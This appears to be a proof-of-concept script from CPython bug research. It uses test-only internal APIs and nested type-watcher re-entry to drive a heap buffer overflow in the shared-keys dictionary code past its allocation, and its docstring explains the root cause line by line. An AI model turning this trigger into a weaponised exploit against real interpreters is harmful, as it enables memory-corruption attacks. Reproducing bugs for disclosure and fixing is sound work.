"""CPY-0096 GIL-arm consequence, deep-nesting variant: drive dk_nentries past the
END of the shared-keys allocation, not merely past dk_usable.

Why nesting is needed
---------------------
_PyDict_NewKeysForClass (Objects/dictobject.c:7258) allocates

    usable = USABLE_FRACTION(1 << NEXT_LOG2_SHARED_KEYS_MAX_SIZE)   /* = 42 */
    PyMem_Malloc(... + sizeof(PyDictUnicodeEntry) * usable)          /* :7265 */

but initialises the object with

    init_keys_object(keys, ..., SHARED_KEYS_MAX_SIZE /* = 30 */, ...) /* :7275 */

so dk_usable starts at 30 while the entries array holds 42.  A SINGLE re-entry
through insert_split_key's :1971 window therefore writes entry[30] -- past the
dk_usable budget (the debug assertion at :719 fires) but still inside the malloc
block, so ASan stays quiet.

Every nested frame reads `keys->dk_usable > 0` at :1964 BEFORE any of them runs
split_keys_entry_added at :1978.  With N nested frames all N pass the test, and on
unwind all N write at the then-current dk_nentries.  N > 42 puts the write past the
end of the allocation.

Re-arming: _PyType_Modified_Unlocked returns early once tp_version_tag == 0
(Objects/typeobject.c:1189), so the watcher fires only once per version tag.
_testinternalcapi.type_assign_specific_version_unsafe re-arms it each level.

Run:
    PYTHONMALLOC=malloc release-gil-nojit-asan/python gil_arm_insert_split_key_nested.py
"""

import sys

import _testcapi
import _testinternalcapi


class T:
    pass


DEPTH = 60           # > 42 = USABLE_FRACTION(64), the real entries capacity
state = {"depth": 0, "version": 1000, "keep": []}


def hook(unraisable):
    d = state["depth"]
    if d >= DEPTH:
        return
    state["depth"] = d + 1
    # Re-arm: _PyType_Modified_Unlocked bails out when tp_version_tag == 0.
    state["version"] += 1
    try:
        _testinternalcapi.type_assign_specific_version_unsafe(T, state["version"])
    except Exception:
        return
    o = T()
    state["keep"].append(o)
    # Another insert_split_key on the SAME shared keys object, nested inside the
    # previous one's :1964 -> :1976 window.
    setattr(o, f"deep{d}", d)


def main():
    sys.setrecursionlimit(20000)
    sys.unraisablehook = hook
    wid = _testcapi.add_type_watcher(1)
    _testcapi.watch_type(wid, T)

    seed = T()
    seed.warmup = 0

    victim = T()
    print(f"triggering nested insert_split_key, target depth {DEPTH}", flush=True)
    victim.trigger = 1
    print(f"survived; reached depth {state['depth']}", flush=True)
    print(f"victim.__dict__ = {victim.__dict__}")
    for _ in range(3):
        T().probe = 1
    print("done", flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
